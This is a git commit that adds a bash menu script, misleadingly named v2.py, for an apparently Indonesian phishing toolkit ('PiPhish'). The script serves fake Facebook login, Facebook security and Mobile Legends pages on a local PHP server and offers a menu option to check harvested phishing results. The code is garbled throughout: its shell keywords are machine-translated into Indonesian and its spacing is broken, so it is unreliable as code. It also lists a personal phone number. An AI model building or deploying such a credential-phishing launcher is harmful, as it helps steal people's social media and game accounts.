12384da101b476da8a409a1a509b9295fc6de5c2
https://github.com/Fajar-24/DARKFB <65275087+Fajar-24@users.noreply.github.com>
2020-06-03 02:42:21 +0700

    Create v2.py

---
+++ v2.py
@@ -0,0 +1,118 @@
+bersih
+bi = ' \ 033 [34; 1m '  # biru
+i = ' \ 033 [32; 1m '  # ijo
+pur = ' \ 033 [35; 1m '  # ungu
+cy = ' \ 033 [36; 1m '  # cyan
+saya = ' \ 033 [31; 1m '  # merah
+pu = ' \ 033 [37; 1m '  # putih
+ku = ' \ 033 [33; 1m '  # kuning
+toilet-masa depan " FBPHISH "  | lolcat
+echo  $ pur " author @ FAJAR CYBER "
+echo  $ pur " berlangganan youtube.com/Yombu "
+python2 p.py
+bersih
+echo  $ pur " ____________________________________ "
+toilet - masa depan " PIPHISH "
+toilet -f istilah "    / \ _ / \ "  | lolcat
+toilet -f istilah " = [• ~ •] = Mpsssh aahh "  | lolcat
+toilet -dilah istilah "     [\] _ "  | lolcat
+toilet -dilah istilah "     // • • "  | lolcat
+toilet -dilah istilah "            • • • "  | lolcat
+toilet -dilah istilah "              • • "  | lolcat
+echo  $ i  " v.2 penulis @ridzwanirawan "
+echo  $ i  " WA: 083890193922 "
+echo  $ pur " ____________________________________ "
+tidur 1
+gema
+echo  $ i " ketika server dimulai: "
+echo  $ pur " [ "  $ ku " ? "  $ pur " ] "  $ ku " buka sesi baru "
+echo  $ pur " [ "  $ ku " ? "  $ pur " ] "  $ ku " jalankan listen.sh "
+echo  $ pur " ____________________________________ "
+echo  $ pur " [ " $ ku " 1 " $ pur " ] " $ ku " INSTAL SEMUA MODUL YANG DIBUTUHKAN "
+echo  $ pur " [ " $ ku " 2 " $ pur " ] " $ ku " FACEBOOK SECURE "
+echo  $ pur " [ " $ ku " 3 " $ pur " ] " $ ku " FACEBOOK LOGIN "
+echo  $ pur " [ " $ ku " 4 " $ pur " ] " $ ku " FREEFIRE "
+echo  $ pur " [ " $ ku " 5 " $ pur " ] " $ ku " LEGENDA MOBILE "
+echo  $ pur " [ " $ ku " 6 " $ pur " ] " $ ku " PEMBARUAN "
+echo  $ pur " [ " $ ku " 7 " $ pur " ] " $ ku " CEK HASIL PHISHING "
+echo  $ pur " [ " $ ku " 8 " $ pur " ] " $ ku " EXIT "
+echo  $ pur " ____________________________________ "
+echo  $ pur " ╭─ [ " $ pur " root @ r12n " $ pur " ] "
+baca -p " ╰─ >> " pil
+
+if [ $ pil  = 1]
+kemudian
+pembaruan pkg
+peningkatan pkg
+apt-get install bash
+untuk menginstal apache2
+pkg instal nano
+pkg instal python2
+pkg instal ruby ​​toilet figlet
+install permata lolcat
+untuk menginstal openssh
+untuk menginstal autossh
+pkg instal php
+echo  $ cy " semua modul berhasil diinstal "
+tidur 4
+sh run.sh
+fi
+
+if [ $ pil  = 2]
+kemudian
+echo  $ i " chotto a minute kudasai ... "
+tidur 1
+echo  $ pur " sekarang buka sesi baru dan jalankan listen.sh "
+echo  $ ku " __________________________________ "
+tidur 1
+echo  $ pur "   LIHAT KEAMANAN FACEBOOK PHISING   "
+php -S localhost: 8080 -t /data/data/com.termux/files/home/PiPhish/V1
+fi
+
+if [ $ pil  = 3]
+kemudian
+echo  $ i " chotto a minute kudasai ... "
+tidur 1
+echo  $ pur " sekarang buka sesi baru dan jalankan listen.sh "
+echo  $ ku " _________________________________ "
+echo  $ pur "   PHISING FACEBOOK LOGIN MOBILE "
+php -S localhost: 8080 -t /data/data/com.termux/files/home/PiPhish/V2
+fi
+
+if [ $ pil  = 4]
+kemudian
+echo  $ i " Segera Hadir, perlu diperbarui "
+fi
+
+if [ $ pil  = 5]
+kemudian
+echo  $ i " chotto a minute kudasai ... "
+tidur 1
+echo  $ pur " sekarang buka sesi baru dan jalankan listen.sh "
+echo  $ ku " _________________________________ "
+echo  $ pur "   PHISING LEGENDA MOBILE "
+php -S localhost: 8080 -t ~ / PiPhish / ML
+fi
+
+if [ $ pil  = 6]
+kemudian
+git pull
+fi
+
+if [ $ pil  = 7]
+kemudian
+cd  ~ / PiPhish
+sh hasil.sh
+fi
+
+if [ $ pil  = 8]
+kemudian
+gema
+gema
+echo  $ pur  " Terima Kasih Telah Menggunakan Alat Ini "
+tidur 2
+echo  $ ku  " BERLANGGANAN MY CHANNEL www.youtube.com/Yambu "
+gema
+tidur 1
+keluar
+fi
